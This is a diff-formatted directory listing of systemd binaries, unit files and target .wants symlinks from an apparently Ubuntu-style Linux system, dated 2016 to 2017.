+-rwxr-xr-x  1 root root 443K Jul 19  2017 systemd-udevd
+-rwxr-xr-x  1 root root 828K Jul 19  2017 systemd-networkd
+-rwxr-xr-x  1 root root  31K Jul 19  2017 systemd-reply-password
+-rwxr-xr-x  1 root root  91K Jul 19  2017 systemd-rfkill
+-rwxr-xr-x  1 root root 143K Jul 19  2017 systemd-shutdown
+-rwxr-xr-x  1 root root  71K Jul 19  2017 systemd-sleep
+-rwxr-xr-x  1 root root  91K Jul 19  2017 systemd-backlight
+-rwxr-xr-x  1 root root  47K Jul 19  2017 systemd-binfmt
+-rwxr-xr-x  1 root root 301K Jul 19  2017 systemd-fsck
+-rwxr-xr-x  1 root root 276K Jul 19  2017 systemd-initctl
+-rwxr-xr-x  1 root root 319K Jul 19  2017 systemd-journald
+-rwxr-xr-x  1 root root 605K Jul 19  2017 systemd-logind
+-rwxr-xr-x  1 root root  51K Jul 19  2017 systemd-modules-load
+-rwxr-xr-x  1 root root  35K Jul 19  2017 systemd-random-seed
+-rwxr-xr-x  1 root root 333K Jul 19  2017 systemd-timedated
+-rwxr-xr-x  1 root root  35K Jul 19  2017 systemd-user-sessions
+-rwxr-xr-x  1 root root  15K Jul 19  2017 systemd-ac-power
+-rwxr-xr-x  1 root root 268K Jul 19  2017 systemd-cgroups-agent
+-rwxr-xr-x  1 root root 332K Jul 19  2017 systemd-hostnamed
+-rwxr-xr-x  1 root root 123K Jul 19  2017 systemd-networkd-wait-online
+-rwxr-xr-x  1 root root  35K Jul 19  2017 systemd-quotacheck
+-rwxr-xr-x  1 root root 653K Jul 19  2017 systemd-resolved
+-rwxr-xr-x  1 root root 139K Jul 19  2017 systemd-timesyncd
+-rwxr-xr-x  1 root root 276K Jul 19  2017 systemd-update-utmp
+-rwxr-xr-x  1 root root 1.6M Jul 19  2017 systemd
+-rwxr-xr-x  1 root root  55K Jul 19  2017 systemd-activate
+-rwxr-xr-x  1 root root 103K Jul 19  2017 systemd-bootchart
+-rwxr-xr-x  1 root root 352K Jul 19  2017 systemd-bus-proxyd
+-rwxr-xr-x  1 root root  91K Jul 19  2017 systemd-cryptsetup
+-rwxr-xr-x  1 root root 340K Jul 19  2017 systemd-localed
+-rwxr-xr-x  1 root root  51K Jul 19  2017 systemd-remount-fs
+-rwxr-xr-x  1 root root  51K Jul 19  2017 systemd-sysctl
+-rwxr-xr-x  1 root root  75K Jul 19  2017 systemd-fsckd
+-rwxr-xr-x  1 root root  31K Jul 19  2017 systemd-hibernate-resume
+-rwxr-xr-x  1 root root  91K Jul 19  2017 systemd-socket-proxyd
+-rwxr-xr-x  1 root root 1.3K Jul  5  2017 systemd-sysv-install
+drwxr-xr-x  2 root root 4.0K Apr 12  2016 system-shutdown
+
+/lib/systemd/system:
+total 932K
+lrwxrwxrwx 1 root root    9 Aug 29  2017 screen-cleanup.service -> /dev/null
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 halt.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 initrd-switch-root.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 kexec.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 multi-user.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 poweroff.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 reboot.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 sysinit.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 sockets.target.wants
+lrwxrwxrwx 1 root root   16 Aug 29  2017 runlevel5.target -> graphical.target
+lrwxrwxrwx 1 root root   13 Aug 29  2017 runlevel6.target -> reboot.target
+lrwxrwxrwx 1 root root    9 Aug 29  2017 sendsigs.service -> /dev/null
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 sigpwr.target.wants
+lrwxrwxrwx 1 root root    9 Aug 29  2017 single.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 stop-bootlogd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 stop-bootlogd-single.service -> /dev/null
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 systemd-resolved.service.d
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 systemd-timesyncd.service.d
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 timers.target.wants
+lrwxrwxrwx 1 root root   21 Aug 29  2017 udev.service -> systemd-udevd.service
+lrwxrwxrwx 1 root root    9 Aug 29  2017 umountfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 umountnfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 umountroot.service -> /dev/null
+lrwxrwxrwx 1 root root   27 Aug 29  2017 urandom.service -> systemd-random-seed.service
+lrwxrwxrwx 1 root root    9 Aug 29  2017 x11-common.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 killprocs.service -> /dev/null
+lrwxrwxrwx 1 root root   28 Aug 29  2017 kmod.service -> systemd-modules-load.service
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 local-fs.target.wants
+lrwxrwxrwx 1 root root   28 Aug 29  2017 module-init-tools.service -> systemd-modules-load.service
+lrwxrwxrwx 1 root root    9 Aug 29  2017 motd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 mountall-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 mountall.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 mountdevsubfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 mountkernfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 mountnfs-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 mountnfs.service -> /dev/null
+lrwxrwxrwx 1 root root   22 Aug 29  2017 procps.service -> systemd-sysctl.service
+lrwxrwxrwx 1 root root   16 Aug 29  2017 rc.local.service -> rc-local.service
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 rc-local.service.d
+lrwxrwxrwx 1 root root    9 Aug 29  2017 rc.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 rcS.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 reboot.service -> /dev/null
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 rescue.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 resolvconf.service.wants
+lrwxrwxrwx 1 root root    9 Aug 29  2017 rmnologin.service -> /dev/null
+lrwxrwxrwx 1 root root   15 Aug 29  2017 runlevel0.target -> poweroff.target
+lrwxrwxrwx 1 root root   13 Aug 29  2017 runlevel1.target -> rescue.target
+lrwxrwxrwx 1 root root   17 Aug 29  2017 runlevel2.target -> multi-user.target
+lrwxrwxrwx 1 root root   17 Aug 29  2017 runlevel3.target -> multi-user.target
+lrwxrwxrwx 1 root root   17 Aug 29  2017 runlevel4.target -> multi-user.target
+lrwxrwxrwx 1 root root    9 Aug 29  2017 checkfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 checkroot-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 checkroot.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 cryptdisks-early.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 cryptdisks.service -> /dev/null
+lrwxrwxrwx 1 root root   13 Aug 29  2017 ctrl-alt-del.target -> reboot.target
+lrwxrwxrwx 1 root root   25 Aug 29  2017 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
+lrwxrwxrwx 1 root root   23 Aug 29  2017 dbus-org.freedesktop.locale1.service -> systemd-localed.service
+lrwxrwxrwx 1 root root   22 Aug 29  2017 dbus-org.freedesktop.login1.service -> systemd-logind.service
+lrwxrwxrwx 1 root root   24 Aug 29  2017 dbus-org.freedesktop.network1.service -> systemd-networkd.service
+lrwxrwxrwx 1 root root   24 Aug 29  2017 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
+lrwxrwxrwx 1 root root   25 Aug 29  2017 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
+lrwxrwxrwx 1 root root   16 Aug 29  2017 default.target -> graphical.target
+lrwxrwxrwx 1 root root    9 Aug 29  2017 fuse.service -> /dev/null
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 getty.target.wants
+drwxr-xr-x 2 root root 4.0K Aug 29  2017 graphical.target.wants
+lrwxrwxrwx 1 root root    9 Aug 29  2017 halt.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 hostname.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 hwclock.service -> /dev/null
+lrwxrwxrwx 1 root root   14 Aug 29  2017 autovt@.service -> getty@.service
+lrwxrwxrwx 1 root root    9 Aug 29  2017 bootlogd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 bootlogs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Aug 29  2017 bootmisc.service -> /dev/null
+-rw-r--r-- 1 root root  683 Aug 23  2017 lxd.service
+-rw-r--r-- 1 root root  206 Aug 23  2017 lxd-bridge.service
+-rw-r--r-- 1 root root  318 Aug 23  2017 lxd-containers.service
+-rw-r--r-- 1 root root  197 Aug 23  2017 lxd.socket
+drwxr-xr-x 2 root root 4.0K Aug  1  2017 busnames.target.wants
+-rw-r--r-- 1 root root  879 Jul 19  2017 basic.target
+-rw-r--r-- 1 root root  379 Jul 19  2017 bluetooth.target
+-rw-r--r-- 1 root root  358 Jul 19  2017 busnames.target
+-rw-r--r-- 1 root root  770 Jul 19  2017 console-getty.service
+-rw-r--r-- 1 root root  742 Jul 19  2017 console-shell.service
+-rw-r--r-- 1 root root  791 Jul 19  2017 container-getty@.service
+-rw-r--r-- 1 root root  394 Jul 19  2017 cryptsetup-pre.target
+-rw-r--r-- 1 root root  366 Jul 19  2017 cryptsetup.target
+-rw-r--r-- 1 root root 1010 Jul 19  2017 debug-shell.service
+-rw-r--r-- 1 root root  670 Jul 19  2017 dev-hugepages.mount
+-rw-r--r-- 1 root root  624 Jul 19  2017 dev-mqueue.mount
+-rw-r--r-- 1 root root 1009 Jul 19  2017 emergency.service
+-rw-r--r-- 1 root root  431 Jul 19  2017 emergency.target
+-rw-r--r-- 1 root root  501 Jul 19  2017 exit.target
+-rw-r--r-- 1 root root  440 Jul 19  2017 final.target
+-rw-r--r-- 1 root root 1.5K Jul 19  2017 getty@.service
+-rw-r--r-- 1 root root  460 Jul 19  2017 getty.target
+-rw-r--r-- 1 root root  558 Jul 19  2017 graphical.target
+-rw-r--r-- 1 root root  487 Jul 19  2017 halt.target
+-rw-r--r-- 1 root root  447 Jul 19  2017 hibernate.target
+-rw-r--r-- 1 root root  468 Jul 19  2017 hybrid-sleep.target
+-rw-r--r-- 1 root root  630 Jul 19  2017 initrd-cleanup.service
+-rw-r--r-- 1 root root  553 Jul 19  2017 initrd-fs.target
+-rw-r--r-- 1 root root  790 Jul 19  2017 initrd-parse-etc.service
+-rw-r--r-- 1 root root  526 Jul 19  2017 initrd-root-fs.target
+-rw-r--r-- 1 root root  640 Jul 19  2017 initrd-switch-root.service
+-rw-r--r-- 1 root root  691 Jul 19  2017 initrd-switch-root.target
+-rw-r--r-- 1 root root  671 Jul 19  2017 initrd.target
+-rw-r--r-- 1 root root  664 Jul 19  2017 initrd-udevadm-cleanup-db.service
+-rw-r--r-- 1 root root  501 Jul 19  2017 kexec.target
+-rw-r--r-- 1 root root  677 Jul 19  2017 kmod-static-nodes.service
+-rw-r--r-- 1 root root  395 Jul 19  2017 local-fs-pre.target
+-rw-r--r-- 1 root root  507 Jul 19  2017 local-fs.target
+-rw-r--r-- 1 root root  405 Jul 19  2017 machine.slice
+-rw-r--r-- 1 root root  473 Jul 19  2017 mail-transport-agent.target
+-rw-r--r-- 1 root root  492 Jul 19  2017 multi-user.target
+-rw-r--r-- 1 root root  464 Jul 19  2017 network-online.target
+-rw-r--r-- 1 root root  461 Jul 19  2017 network-pre.target
+-rw-r--r-- 1 root root  480 Jul 19  2017 network.target
+-rw-r--r-- 1 root root  514 Jul 19  2017 nss-lookup.target
+-rw-r--r-- 1 root root  473 Jul 19  2017 nss-user-lookup.target
+-rw-r--r-- 1 root root  354 Jul 19  2017 paths.target
+-rw-r--r-- 1 root root  552 Jul 19  2017 poweroff.target
+-rw-r--r-- 1 root root  377 Jul 19  2017 printer.target
+-rw-r--r-- 1 root root  693 Jul 19  2017 proc-sys-fs-binfmt_misc.automount
+-rw-r--r-- 1 root root  603 Jul 19  2017 proc-sys-fs-binfmt_misc.mount
+-rw-r--r-- 1 root root  568 Jul 19  2017 quotaon.service
+-rw-r--r-- 1 root root  612 Jul 19  2017 rc-local.service
+-rw-r--r-- 1 root root  543 Jul 19  2017 reboot.target
+-rw-r--r-- 1 root root  396 Jul 19  2017 remote-fs-pre.target
+-rw-r--r-- 1 root root  482 Jul 19  2017 remote-fs.target
+-rw-r--r-- 1 root root  978 Jul 19  2017 rescue.service
+-rw-r--r-- 1 root root  486 Jul 19  2017 rescue.target
+-rw-r--r-- 1 root root  500 Jul 19  2017 rpcbind.target
+-rw-r--r-- 1 root root 1.1K Jul 19  2017 serial-getty@.service
+-rw-r--r-- 1 root root  402 Jul 19  2017 shutdown.target
+-rw-r--r-- 1 root root  362 Jul 19  2017 sigpwr.target
+-rw-r--r-- 1 root root  420 Jul 19  2017 sleep.target
+-rw-r--r-- 1 root root  403 Jul 19  2017 -.slice
+-rw-r--r-- 1 root root  409 Jul 19  2017 slices.target
+-rw-r--r-- 1 root root  380 Jul 19  2017 smartcard.target
+-rw-r--r-- 1 root root  356 Jul 19  2017 sockets.target
+-rw-r--r-- 1 root root  380 Jul 19  2017 sound.target
+-rw-r--r-- 1 root root  441 Jul 19  2017 suspend.target
+-rw-r--r-- 1 root root  353 Jul 19  2017 swap.target
+-rw-r--r-- 1 root root  715 Jul 19  2017 sys-fs-fuse-connections.mount
+-rw-r--r-- 1 root root  518 Jul 19  2017 sysinit.target
+-rw-r--r-- 1 root root  719 Jul 19  2017 sys-kernel-config.mount
+-rw-r--r-- 1 root root  662 Jul 19  2017 sys-kernel-debug.mount
+-rw-r--r-- 1 root root 1.3K Jul 19  2017 syslog.socket
+-rw-r--r-- 1 root root  646 Jul 19  2017 systemd-ask-password-console.path
+-rw-r--r-- 1 root root  653 Jul 19  2017 systemd-ask-password-console.service
+-rw-r--r-- 1 root root  574 Jul 19  2017 systemd-ask-password-wall.path
+-rw-r--r-- 1 root root  681 Jul 19  2017 systemd-ask-password-wall.service
+-rw-r--r-- 1 root root  724 Jul 19  2017 systemd-backlight@.service
+-rw-r--r-- 1 root root  959 Jul 19  2017 systemd-binfmt.service
+-rw-r--r-- 1 root root  650 Jul 19  2017 systemd-bootchart.service
+-rw-r--r-- 1 root root 1.0K Jul 19  2017 systemd-bus-proxyd.service
+-rw-r--r-- 1 root root  409 Jul 19  2017 systemd-bus-proxyd.socket
+-rw-r--r-- 1 root root  497 Jul 19  2017 systemd-exit.service
+-rw-r--r-- 1 root root  551 Jul 19  2017 systemd-fsckd.service
+-rw-r--r-- 1 root root  540 Jul 19  2017 systemd-fsckd.socket
+-rw-r--r-- 1 root root  674 Jul 19  2017 systemd-fsck-root.service
+-rw-r--r-- 1 root root  648 Jul 19  2017 systemd-fsck@.service
+-rw-r--r-- 1 root root  544 Jul 19  2017 systemd-halt.service
+-rw-r--r-- 1 root root  631 Jul 19  2017 systemd-hibernate-resume@.service
+-rw-r--r-- 1 root root  501 Jul 19  2017 systemd-hibernate.service
+-rw-r--r-- 1 root root  710 Jul 19  2017 systemd-hostnamed.service
+-rw-r--r-- 1 root root  778 Jul 19  2017 systemd-hwdb-update.service
+-rw-r--r-- 1 root root  519 Jul 19  2017 systemd-hybrid-sleep.service
+-rw-r--r-- 1 root root  480 Jul 19  2017 systemd-initctl.service
+-rw-r--r-- 1 root root  524 Jul 19  2017 systemd-initctl.socket
+-rw-r--r-- 1 root root  607 Jul 19  2017 systemd-journald-audit.socket
+-rw-r--r-- 1 root root 1.1K Jul 19  2017 systemd-journald-dev-log.socket
+-rw-r--r-- 1 root root 1.3K Jul 19  2017 systemd-journald.service
+-rw-r--r-- 1 root root  842 Jul 19  2017 systemd-journald.socket
+-rw-r--r-- 1 root root  731 Jul 19  2017 systemd-journal-flush.service
+-rw-r--r-- 1 root root  557 Jul 19  2017 systemd-kexec.service
+-rw-r--r-- 1 root root  691 Jul 19  2017 systemd-localed.service
+-rw-r--r-- 1 root root 1.2K Jul 19  2017 systemd-logind.service
+-rw-r--r-- 1 root root  693 Jul 19  2017 systemd-machine-id-commit.service
+-rw-r--r-- 1 root root  967 Jul 19  2017 systemd-modules-load.service
+-rw-r--r-- 1 root root 1.3K Jul 19  2017 systemd-networkd.service
+-rw-r--r-- 1 root root  591 Jul 19  2017 systemd-networkd.socket
+-rw-r--r-- 1 root root  685 Jul 19  2017 systemd-networkd-wait-online.service
+-rw-r--r-- 1 root root  553 Jul 19  2017 systemd-poweroff.service
+-rw-r--r-- 1 root root  614 Jul 19  2017 systemd-quotacheck.service
+-rw-r--r-- 1 root root  717 Jul 19  2017 systemd-random-seed.service
+-rw-r--r-- 1 root root  548 Jul 19  2017 systemd-reboot.service
+-rw-r--r-- 1 root root  757 Jul 19  2017 systemd-remount-fs.service
+-rw-r--r-- 1 root root  907 Jul 19  2017 systemd-resolved.service
+-rw-r--r-- 1 root root  696 Jul 19  2017 systemd-rfkill.service
+-rw-r--r-- 1 root root  617 Jul 19  2017 systemd-rfkill.socket
+-rw-r--r-- 1 root root  497 Jul 19  2017 systemd-suspend.service
+-rw-r--r-- 1 root root  649 Jul 19  2017 systemd-sysctl.service
+-rw-r--r-- 1 root root  655 Jul 19  2017 systemd-timedated.service
+-rw-r--r-- 1 root root 1.1K Jul 19  2017 systemd-timesyncd.service
+-rw-r--r-- 1 root root  598 Jul 19  2017 systemd-tmpfiles-clean.service
+-rw-r--r-- 1 root root  450 Jul 19  2017 systemd-tmpfiles-clean.timer
+-rw-r--r-- 1 root root  703 Jul 19  2017 systemd-tmpfiles-setup-dev.service
+-rw-r--r-- 1 root root  683 Jul 19  2017 systemd-tmpfiles-setup.service
+-rw-r--r-- 1 root root  578 Jul 19  2017 systemd-udevd-control.socket
+-rw-r--r-- 1 root root  570 Jul 19  2017 systemd-udevd-kernel.socket
+-rw-r--r-- 1 root root  825 Jul 19  2017 systemd-udevd.service
+-rw-r--r-- 1 root root  823 Jul 19  2017 systemd-udev-settle.service
+-rw-r--r-- 1 root root  743 Jul 19  2017 systemd-udev-trigger.service
+-rw-r--r-- 1 root root  757 Jul 19  2017 systemd-update-utmp-runlevel.service
+-rw-r--r-- 1 root root  754 Jul 19  2017 systemd-update-utmp.service
+-rw-r--r-- 1 root root  573 Jul 19  2017 systemd-user-sessions.service
+-rw-r--r-- 1 root root  436 Jul 19  2017 system.slice
+-rw-r--r-- 1 root root  585 Jul 19  2017 system-update.target
+-rw-r--r-- 1 root root  405 Jul 19  2017 timers.target
+-rw-r--r-- 1 root root  395 Jul 19  2017 time-sync.target
+-rw-r--r-- 1 root root  417 Jul 19  2017 umount.target
+-rw-r--r-- 1 root root  528 Jul 19  2017 user@.service
+-rw-r--r-- 1 root root  392 Jul 19  2017 user.slice
+-rw-r--r-- 1 root root  342 Jul 17  2017 getty-static.service
+-rw-r--r-- 1 root root  153 Jul 17  2017 sigpwr-container-shutdown.service
+-rw-r--r-- 1 root root  175 Jul 17  2017 systemd-networkd-resolvconf-update.path
+-rw-r--r-- 1 root root  715 Jul 17  2017 systemd-networkd-resolvconf-update.service
+-rw-r--r-- 1 root root  192 Jul 17  2017 snapd.autoimport.service
+-rw-r--r-- 1 root root  368 Jul 17  2017 snapd.core-fixup.service
+-rw-r--r-- 1 root root  290 Jul 17  2017 snapd.refresh.service
+-rw-r--r-- 1 root root  323 Jul 17  2017 snapd.refresh.timer
+-rw-r--r-- 1 root root  212 Jul 17  2017 snapd.service
+-rw-r--r-- 1 root root  281 Jul 17  2017 snapd.socket
+-rw-r--r-- 1 root root  474 Jul 17  2017 snapd.system-shutdown.service
+-rw-r--r-- 1 root root  642 Jul 14  2017 mongod.service
+-rw-r--r-- 1 root root  311 Jul  5  2017 lxcfs.service
+-rw-r--r-- 1 root root  169 Jun 19  2017 apt-daily.service
+-rw-r--r-- 1 root root  212 Jun 19  2017 apt-daily.timer
+-rw-r--r-- 1 root root  202 Jun 19  2017 apt-daily-upgrade.service
+-rw-r--r-- 1 root root  184 Jun 19  2017 apt-daily-upgrade.timer
+-rw-r--r-- 1 root root  189 Jun 14  2017 uuidd.service
+-rw-r--r-- 1 root root  126 Jun 14  2017 uuidd.socket
+-rw-r--r-- 1 root root  345 Apr 20  2017 unattended-upgrades.service
+-rw-r--r-- 1 root root  385 Mar 16  2017 ssh.service
+-rw-r--r-- 1 root root  196 Mar 16  2017 ssh@.service
+-rw-r--r-- 1 root root  216 Mar 16  2017 ssh.socket
+-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service
+-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service
+-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket
+-rw-r--r-- 1 root root  420 Dec  7  2016 resolvconf.service
+-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service
+-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service
+-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service
+-rw-r--r-- 1 root root  251 Sep 18  2016 open-vm-tools.service
+-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service
+-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service
+lrwxrwxrwx 1 root root   27 May 10  2016 plymouth-log.service -> plymouth-read-write.service
+lrwxrwxrwx 1 root root   21 May 10  2016 plymouth.service -> plymouth-quit.service
+-rw-r--r-- 1 root root  412 May 10  2016 plymouth-halt.service
+-rw-r--r-- 1 root root  426 May 10  2016 plymouth-kexec.service
+-rw-r--r-- 1 root root  421 May 10  2016 plymouth-poweroff.service
+-rw-r--r-- 1 root root  194 May 10  2016 plymouth-quit.service
+-rw-r--r-- 1 root root  200 May 10  2016 plymouth-quit-wait.service
+-rw-r--r-- 1 root root  244 May 10  2016 plymouth-read-write.service
+-rw-r--r-- 1 root root  416 May 10  2016 plymouth-reboot.service
+-rw-r--r-- 1 root root  532 May 10  2016 plymouth-start.service
+-rw-r--r-- 1 root root  291 May 10  2016 plymouth-switch-root.service
+-rw-r--r-- 1 root root  490 May 10  2016 systemd-ask-password-plymouth.path
+-rw-r--r-- 1 root root  467 May 10  2016 systemd-ask-password-plymouth.service
+lrwxrwxrwx 1 root root    9 Apr 16  2016 lvm2.service -> /dev/null
+-rw-r--r-- 1 root root  334 Apr 16  2016 dm-event.service
+-rw-r--r-- 1 root root  248 Apr 16  2016 dm-event.socket
+-rw-r--r-- 1 root root  380 Apr 16  2016 lvm2-lvmetad.service
+-rw-r--r-- 1 root root  215 Apr 16  2016 lvm2-lvmetad.socket
+-rw-r--r-- 1 root root  335 Apr 16  2016 lvm2-lvmpolld.service
+-rw-r--r-- 1 root root  213 Apr 16  2016 lvm2-lvmpolld.socket
+-rw-r--r-- 1 root root  658 Apr 16  2016 lvm2-monitor.service
+-rw-r--r-- 1 root root  382 Apr 16  2016 lvm2-pvscan@.service
+drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants
+-rw-r--r-- 1 root root  234 Apr  8  2016 acpid.service
+-rw-r--r-- 1 root root  251 Apr  5  2016 cron.service
+-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service
+-rw-r--r-- 1 root root  142 Mar 31  2016 apport-forward@.service
+-rw-r--r-- 1 root root  225 Mar 31  2016 apport-forward.socket
+-rw-r--r-- 1 root root  455 Mar 29  2016 iscsid.service
+-rw-r--r-- 1 root root 1.1K Mar 29  2016 open-iscsi.service
+-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.socket
+-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.path
+-rw-r--r-- 1 root root  169 Jan 14  2016 atd.service
+-rw-r--r-- 1 root root  182 Jan 14  2016 polkitd.service
+-rw-r--r-- 1 root root  790 Jun  1  2015 friendly-recovery.service
+-rw-r--r-- 1 root root  241 Mar  3  2015 ufw.service
+-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service
+-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer
+-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service
+-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service
+
+/lib/systemd/system/halt.target.wants:
+total 0
+lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-halt.service -> ../plymouth-halt.service
+
+/lib/systemd/system/initrd-switch-root.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -> ../plymouth-start.service
+lrwxrwxrwx 1 root root 31 May 10  2016 plymouth-switch-root.service -> ../plymouth-switch-root.service
+
+/lib/systemd/system/kexec.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-kexec.service -> ../plymouth-kexec.service
+
+/lib/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx 1 root root 15 Aug 29  2017 getty.target -> ../getty.target
+lrwxrwxrwx 1 root root 33 Aug 29  2017 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
+lrwxrwxrwx 1 root root 25 Aug 29  2017 systemd-logind.service -> ../systemd-logind.service
+lrwxrwxrwx 1 root root 39 Aug 29  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx 1 root root 32 Aug 29  2017 systemd-user-sessions.service -> ../systemd-user-sessions.service
+lrwxrwxrwx 1 root root 15 Jan 12  2017 dbus.service -> ../dbus.service
+lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-quit.service -> ../plymouth-quit.service
+lrwxrwxrwx 1 root root 29 May 10  2016 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
+
+/lib/systemd/system/poweroff.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Aug 29  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx 1 root root 28 May 10  2016 plymouth-poweroff.service -> ../plymouth-poweroff.service
+
+/lib/systemd/system/reboot.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Aug 29  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx 1 root root 26 May 10  2016 plymouth-reboot.service -> ../plymouth-reboot.service
+
+/lib/systemd/system/sysinit.target.wants:
+total 0
+lrwxrwxrwx 1 root root 24 Aug 29  2017 console-setup.service -> ../console-setup.service
+lrwxrwxrwx 1 root root 20 Aug 29  2017 cryptsetup.target -> ../cryptsetup.target
+lrwxrwxrwx 1 root root 22 Aug 29  2017 dev-hugepages.mount -> ../dev-hugepages.mount
+lrwxrwxrwx 1 root root 19 Aug 29  2017 dev-mqueue.mount -> ../dev-mqueue.mount
+lrwxrwxrwx 1 root root 25 Aug 29  2017 keyboard-setup.service -> ../keyboard-setup.service
+lrwxrwxrwx 1 root root 28 Aug 29  2017 kmod-static-nodes.service -> ../kmod-static-nodes.service
+lrwxrwxrwx 1 root root 36 Aug 29  2017 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
+lrwxrwxrwx 1 root root 19 Aug 29  2017 setvtrgb.service -> ../setvtrgb.service
+lrwxrwxrwx 1 root root 32 Aug 29  2017 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
+lrwxrwxrwx 1 root root 26 Aug 29  2017 sys-kernel-config.mount -> ../sys-kernel-config.mount
+lrwxrwxrwx 1 root root 25 Aug 29  2017 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
+lrwxrwxrwx 1 root root 36 Aug 29  2017 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
+lrwxrwxrwx 1 root root 25 Aug 29  2017 systemd-binfmt.service -> ../systemd-binfmt.service
+lrwxrwxrwx 1 root root 30 Aug 29  2017 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
+lrwxrwxrwx 1 root root 27 Aug 29  2017 systemd-journald.service -> ../systemd-journald.service
+lrwxrwxrwx 1 root root 32 Aug 29  2017 systemd-journal-flush.service -> ../systemd-journal-flush.service
+lrwxrwxrwx 1 root root 36 Aug 29  2017 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
+lrwxrwxrwx 1 root root 31 Aug 29  2017 systemd-modules-load.service -> ../systemd-modules-load.service
+lrwxrwxrwx 1 root root 30 Aug 29  2017 systemd-random-seed.service -> ../systemd-random-seed.service
+lrwxrwxrwx 1 root root 25 Aug 29  2017 systemd-sysctl.service -> ../systemd-sysctl.service
+lrwxrwxrwx 1 root root 37 Aug 29  2017 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
+lrwxrwxrwx 1 root root 33 Aug 29  2017 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
+lrwxrwxrwx 1 root root 24 Aug 29  2017 systemd-udevd.service -> ../systemd-udevd.service
+lrwxrwxrwx 1 root root 31 Aug 29  2017 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
